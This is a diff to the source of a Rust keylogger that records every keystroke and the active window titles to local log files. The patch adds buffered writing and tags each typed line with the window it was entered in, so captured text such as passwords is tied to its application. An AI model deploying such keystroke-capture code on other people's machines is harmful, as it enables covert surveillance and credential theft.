@@ -4,7 +4,7 @@ use device_query::{DeviceQuery, DeviceState, Keycode};
 use std::{
     collections::HashSet,
     fs::OpenOptions,
-    io::Write,
+    io::{BufWriter, Write},
     thread,
     time::{Duration, Instant},
 };
@@ -31,7 +31,7 @@ where
     let active_window_file_path = config.active_window_log_path();
     let timeout_secs = config.timeout_secs();
 
-    let mut key_logger_file = OpenOptions::new()
+    let key_logger_file = OpenOptions::new()
         .create(true)
         .append(true)
         .open(&key_logger_file_path)
@@ -41,13 +41,14 @@ where
                 key_logger_file_path, e
             )
         });
+    let mut key_logger_file = BufWriter::new(key_logger_file);
 
     println!(
         "Key Logger Logs are written to: {:?}",
         &key_logger_file_path
     );
 
-    let mut active_window_file = OpenOptions::new()
+    let active_window_file = OpenOptions::new()
         .create(true)
         .append(true)
         .open(&active_window_file_path)
@@ -57,6 +58,7 @@ where
                 active_window_file_path, e
             )
         });
+    let mut active_window_file = BufWriter::new(active_window_file);
 
     println!(
         "Active window Logs are written to: {:?}",
@@ -80,33 +82,39 @@ where
                     if !current_line.is_empty() {
                         writeln!(
                             key_logger_file,
-                            "[{}] Input: {}",
+                            "[{}] [{}] Input: {}",
                             Local::now().format("%Y-%m-%d %H:%M:%S"),
+                            last_window,
                             current_line
                         )
                         .unwrap();
+                        key_logger_file.flush().unwrap();
                         current_line.clear();
                     }
                 }
             }
         }
 
-        last_keys = keys.clone(); // Update after processing
+        // Update last_keys without cloning the whole vector every loop
+        last_keys.clear();
+        last_keys.extend(keys.iter().cloned());
 
         if last_input_time.elapsed() > Duration::from_secs(timeout_secs) && !current_line.is_empty()
         {
             writeln!(
                 key_logger_file,
-                "[{}] Input: {}",
+                "[{}] [{}] Input: {}",
                 Local::now().format("%Y-%m-%d %H:%M:%S"),
+                last_window,
                 current_line
             )
             .unwrap();
+            key_logger_file.flush().unwrap();
             current_line.clear();
         }
 
         if let Some(title) = get_active_window() {
-            if title != last_window {
+            if !title.trim().is_empty() && !is_garbage_title(&title) && title != last_window {
                 last_window = title.clone();
                 writeln!(
                     active_window_file,
@@ -115,6 +123,7 @@ where
                     title
                 )
                 .unwrap();
+                active_window_file.flush().unwrap();
             }
         }
 
@@ -176,4 +185,10 @@ fn keycode_to_char(key: &Keycode, shift: bool) -> Option<char> {
         RightBracket => Some(if shift { '}' } else { ']' }),
         _ => None,
     }
+}
+
+/// Simple filter to avoid logging useless window titles
+fn is_garbage_title(title: &str) -> bool {
+    let lower = title.to_lowercase();
+    lower == "unknown" || lower.ends_with(".exe") || lower.chars().all(|c| !c.is_alphanumeric())
 }
